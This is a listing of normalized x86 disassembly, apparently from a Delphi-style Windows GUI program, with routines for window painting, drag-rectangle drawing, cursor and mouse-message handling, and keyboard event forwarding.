mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440d58
push eax
call InvalidateRect
push ebp
call sub_43a92c
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43aa54
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_451710
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43b724
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403394
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43aab8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44105c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440d58
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43ab91
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43eb64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440d58
push eax
call ReleaseDC
retn
sub_43ac18
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax edi
call sub_43b758
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43a0b4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a00
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43b724
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_4388c0
sub_43acec
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43ad28
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43ad74
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43ada0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43a514
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43a500
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402990
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402990
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_440d58
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43ae84
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43aed0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403394
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403394
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43af94
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43afe0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43b02c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43b147
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41d64c
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b14e
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43b180
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43a0b4
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403394
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403394
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403394
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403394
jmp r-xdata
sub_43b270
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412bb8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43b758
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43a500
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43a514
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412c08
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43b450
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43a088
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403394
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_440d58
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437c84
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43b43b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_440d58
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_440d58
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403198
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_439f10
test esi esi
je r-xdata
sub_43b450
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403394
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43c2d4
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403394
mov eax esi
call sub_439fb8
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_439f74
mov ecx eax
xor edx edx
xor eax eax
call sub_412be0
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403394
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43b4f4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43b524
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43b590
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43b650
sub_43b5c0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43b5f0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43a0b4
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43b61c
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43b650
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43b724
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43b758
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43b7f0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_451710
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_451710
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43a110
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45af4c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403394
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_451654
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403394
jmp r-xdata
sub_43b984
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4088e4
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408910
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43a110
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408728
call sub_4086c4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4086c4
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43ba2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43ba5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43ba20
push ebp
call sub_43ba2c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43baac
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
